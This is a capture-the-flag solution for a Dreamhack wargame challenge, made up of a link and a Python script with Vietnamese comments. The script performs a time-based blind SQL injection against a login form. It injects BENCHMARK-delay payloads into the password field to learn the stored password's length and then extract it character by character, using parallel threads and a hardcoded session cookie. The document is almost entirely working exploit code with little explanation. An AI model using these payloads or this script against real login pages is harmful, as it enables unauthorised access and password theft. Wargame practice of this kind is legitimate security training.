[LINK](https://dreamhack.io/wargame/challenges/566)
- script:
```
import requests
import time
from concurrent.futures import ThreadPoolExecutor

# Cấu hình
URL = "http://host3.dreamhack.games:16932//login"
COOKIES = {"session": "eyJpZCI6eyIgYiI6IkFCSWFFM2pXMVlGZ0VrdzgzQWMzSUE9PSJ9LCJ0cmllcyI6MH0.ak_N2w.nF3w43ATRxb3kDzZxCetoqgubNc"}
MAX_WORKERS = 10  # Số lượng tiến trình chạy song song (tối ưu khoảng 5-10)
TIME_THRESHOLD = 8  # Ngưỡng trễ mới là 8 giây

session = requests.Session()

def check_payload(payload):
    """Gửi request và kiểm tra xem response có trễ hơn 8s không"""
    data = {"username": "a", "password": payload}
    start_time = time.time()
    try:
        # Timeout để 15s để đảm bảo hàm BENCHMARK kịp chạy xong
        session.post(URL, cookies=COOKIES, data=data, timeout=15)
    except:
        return False
    return (time.time() - start_time) > TIME_THRESHOLD

def find_length():
    print("[*] Đang xác định độ dài mật khẩu...")
    for i in range(1, 51):
        payload = f"'||if(length(password)={i},BENCHMARK(20000000,MD5(NOW())),0) -- -"
        if check_payload(payload):
            print(f"[+] Tìm thấy độ dài: {i}")
            return i
    return 0

def worker_check_char(index, char_code):
    """Hàm kiểm tra ký tự cho ThreadPool"""
    payload = f"'||if(ord(mid(password,{index},1))={char_code},BENCHMARK(20000000,MD5(NOW())),0) -- -"
    if check_payload(payload):
        return chr(char_code)
    return None

def extract_data(length):
    password = ""
    print(f"[*] Bắt đầu dò nội dung với {MAX_WORKERS} tiến trình...")
    
    for i in range(1, length + 1):
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            # Tạo danh sách các task kiểm tra mã ASCII từ 32-127
            future_to_char = {executor.submit(worker_check_char, i, j): j for j in range(32, 127)}
            
            for future in future_to_char:
                result = future.result()
                if result:
                    password += result
                    print(f"[+] Ký tự {i}: {result} | Mật khẩu: {password}")
                    break
    print(f"\n[***] Mật khẩu cuối cùng: {password}")

if __name__ == "__main__":
    length = find_length()
    if length > 0:
        extract_data(length)
    else:
        print("[-] Không tìm thấy độ dài mật khẩu.")
```